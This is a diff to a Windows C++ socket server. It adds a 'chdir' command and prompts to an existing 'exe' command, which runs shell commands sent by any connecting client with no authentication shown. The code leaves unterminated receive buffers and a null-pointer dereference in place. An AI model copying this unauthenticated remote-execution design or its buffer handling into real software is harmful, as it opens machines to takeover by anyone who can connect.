@@ -65,8 +65,7 @@ SOCKET ServerSocket::accept_client() {
 std::string get_host_name() {
 	char hostname[20];
 	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
-		std::cerr << "Error " << WSAGetLastError() <<
-			" when getting local host name." << std::endl;
+		std::cout << "Error " << WSAGetLastError() << std::endl;
 	}
 
 	return hostname;
@@ -76,7 +75,7 @@ std::string get_address() {
 	hostent *phe = gethostbyname(get_host_name().c_str());
 	in_addr addr;
 	if (phe == 0) {
-		std::cerr << "Bad host lookup." << std::endl;
+		std::cout << "Bad host lookup." << std::endl;
 	}
 
 	for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
@@ -145,6 +144,11 @@ void ServerSocket::error_output(Socket sock, std::string& error) {
 	return;
 }
 
+void ServerSocket::output(Socket sock, const std::string message) {
+	send(sock, message.c_str(), message.size() + 1, 1);
+	return;
+}
+
 void ServerSocket::error_output(std::string& error) {
 	std::cout << error;
 	return;
@@ -164,13 +168,11 @@ std::string ServerSocket::parse_cmd(Socket sock, std::string & cmd) {
 }
 
 std::string ServerSocket::check_cmd(const std::string& cmd) {
-	if (cmd.size() == 0 || cmd.size() < 4) {
-		error_output(COMMAND_NOT_FOUND);
+	if (cmd.size() < 4) {
 		return COMMAND_NOT_FOUND;
 	}
 
 	if (cmd.size() >= BUFFER_MAX) {
-		error_output(COMMAND_TOO_LONG);
 		return COMMAND_TOO_LONG;
 	}
 
@@ -206,11 +208,36 @@ std::string ServerSocket::parse_header(char* header) {
 	return client;
 }
 
+void ServerSocket::change_dir(Socket sock, const char* dir) {
+	std::string _dir = dir;
+	std::string error_dir = "Unable to locate the directory : ";
+	if (_chdir(dir))
+	{
+		switch (errno)
+		{
+		case ENOENT:
+			output(sock, error_dir.append(dir));
+			break;
+		case EINVAL:
+			output(sock, "Invalid buffer.");
+			break;
+		default:
+			output(sock, "Unknown error.");
+		}
+	}
+	else {
+		exec_cmd(sock, "dir");
+	}
+}
+
 std::string ServerSocket::command_exec(Socket client, std::string& cmd) {
 	const std::string help = "help";
 	const std::string exec = "exe";
 	const std::string check_connections = "checkconn";
 	const std::string EXIT = "exit";
+	const std::string change_dir_msg = "chdir";
+	const std::string exec_your_command = "Enter your command ->";
+	const std::string change_your_directory = "Enter your new directory ->";
 
 	if (cmd.empty()) {
 		error_output(client, COMMAND_NOT_FOUND);
@@ -227,10 +254,27 @@ std::string ServerSocket::command_exec(Socket client, std::string& cmd) {
 		parse_cmd(client, _cmd);
 		if (_cmd == help) {
 			error_output(client, HELP);
-		}else if (_cmd == check_connections) {
+		}
+		else if (_cmd == check_connections) {
 			check_connections_cmd(client, Client::clients);
 		}
+		else if (_cmd == change_dir_msg) {
+			output(client, change_your_directory);
+			char dir[256] = { 0 };
+			int recvbytes;
+			recvbytes = recv(client, dir, 256, 0);
+			if (recvbytes < 0 || recvbytes > 256) {
+				send(client, DIRECTORY_NOT_FOUND.c_str(), DIRECTORY_NOT_FOUND.size(), 1);
+				memset(dir, 0, strlen(dir));
+			}
+			else {
+				change_dir(client, dir);
+				memset(dir, 0, strlen(dir));
+			}
+			memset(dir, 0, strlen(dir));
+		}
 		else if (_cmd == exec) {
+			output(client, exec_your_command);
 			char text[256] = { 0 };
 			int recvbytes;
 				recvbytes = recv(client, text, 256, 0);
@@ -240,6 +284,7 @@ std::string ServerSocket::command_exec(Socket client, std::string& cmd) {
 				}
 				else {
 					exec_cmd(client, text);
+					memset(text, 0, strlen(text));
 				}
 				memset(text, 0, strlen(text));
 			}
@@ -263,10 +308,7 @@ void handle_new_connection(SOCKET sock) {
 	header_recv = recv(sock, Client::header, HEADER_BUFFER, 0);
 	std::string server_header = "Hello im server. My IP: " + get_address();
 	bytes_sent = send(sock, server_header.c_str(), server_header.size(), 1);
-
-	char buffer[BUFFER_MAX];
-	buffer[BUFFER_MAX - 1] = '\0';
-	memset(buffer, 0, sizeof(buffer));
+	char buffer[BUFFER_MAX] = { 0 };
 
 	std::cout << Client::header << std::endl;
 	clients.push_back(s.parse_header(Client::header));
@@ -300,11 +342,11 @@ void handle_new_connection(SOCKET sock) {
 
 int main(void) {
 	ServerSocket sock;
-	std::list<std::thread*> threads;
+	std::vector<std::thread*> threads;
 	for (;;) {
 		SOCKET socket = sock.accept_client();
 		if (socket == NULL) {
-			std::cerr << "errorr";
+			std::cout << "errorr" << std::endl;
 			continue;
 		}
 		++online_clients;
